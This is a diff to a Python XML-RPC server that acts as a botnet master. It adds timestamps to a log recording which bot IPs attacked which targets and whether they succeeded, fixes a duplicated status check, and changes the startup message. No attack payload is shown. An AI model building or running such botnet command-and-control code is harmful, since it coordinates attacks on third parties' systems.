@@ -1,5 +1,6 @@
 from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
 import socket
+from time import gmtime, strftime
 
 
 class RequestHandler(SimpleXMLRPCRequestHandler):
@@ -33,13 +34,15 @@ def unregisterIP(ip_address):
 def getLogFromBotnet(ip_botnet, ip_target, status):
     with open("log.txt", "a") as file:
         if status == "success":
-            file.write(ip_botnet+" successfully attack " + ip_target + "\n")
-        elif status == "success":
-            file.write(ip_botnet+" failed to attack " + ip_target + "\n")
+            file.write("("+strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ") " +
+                       ip_botnet+" successfully attack " + ip_target + "\n")
+        elif status == "failed":
+            file.write("("+strftime("%Y-%m-%d %H:%M:%S", gmtime()) +
+                       ") " + ip_botnet+" failed to attack " + ip_target + "\n")
 
 
 if __name__ == '__main__':
-    print(getMasterIpAddress())
+    print("Listening botnet request(s) on " + getMasterIpAddress())
     server = SimpleXMLRPCServer(
         (getMasterIpAddress(), 8000), requestHandler=RequestHandler, allow_none=True)
     server.register_introspection_functions()
